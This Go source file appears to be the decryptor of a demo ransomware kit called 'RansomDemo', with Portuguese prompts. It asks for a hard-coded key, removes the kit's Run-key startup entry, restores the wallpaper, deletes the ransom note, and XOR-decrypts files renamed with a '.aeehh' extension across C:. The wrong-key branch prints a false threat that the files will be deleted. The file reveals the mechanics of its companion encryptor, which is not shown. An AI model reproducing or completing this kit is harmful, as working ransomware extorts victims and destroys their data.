package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	password  = "123"
	targetDir = `C:` // <--- ALTERE AQUI (igual ao encryptor.go)
)

var excludeDirs = map[string]bool{
	"Windows":             true,
	"Program Files":       true,
	"Program Files (x86)": true,
	"Users":               true,
}

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func restoreDefaultWallpaper() {
	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg`
	user32 := windows.NewLazySystemDLL("user32.dll")
	systemParameters := user32.NewProc("SystemParametersInfoW")

	pathUTF16, _ := windows.UTF16PtrFromString(defaultWallpaper)
	systemParameters.Call(
		uintptr(0x0014),
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(0x01|0x02),
	)
}

func removeFromStartup() {
	key, _ := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	defer key.Close()
	key.DeleteValue("RansomDemo")
}

func main() {
	fmt.Print("\033[36m")
	fmt.Println("[?] Insira a chave de descriptografia:")
	fmt.Print("\033[0m")

	var inputKey string
	fmt.Scanln(&inputKey)

	if inputKey != password {
		fmt.Print("\033[31m")
		fmt.Println("⚠️ CHAVE INVÁLIDA! OS ARQUIVOS SERÃO DELETADOS!")
		fmt.Print("\033[0m")
		time.Sleep(10 * time.Second)
		return
	}

	removeFromStartup()
	restoreDefaultWallpaper()
	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))

	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".aeehh") {
			return nil
		}

		if targetDir == `C:` {
			dir := filepath.Base(filepath.Dir(path))
			if excludeDirs[dir] {
				return filepath.SkipDir
			}
		}

		data, _ := os.ReadFile(path)
		decryptedData := xorEncrypt(data)
		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
		originalPath := filepath.Join(filepath.Dir(path), originalName)

		os.WriteFile(originalPath, decryptedData, 0644)
		os.Remove(path)

		return nil
	})

	fmt.Print("\033[32m")
	fmt.Println("[+] Sistema restaurado com sucesso!")
	fmt.Print("\033[0m")
}
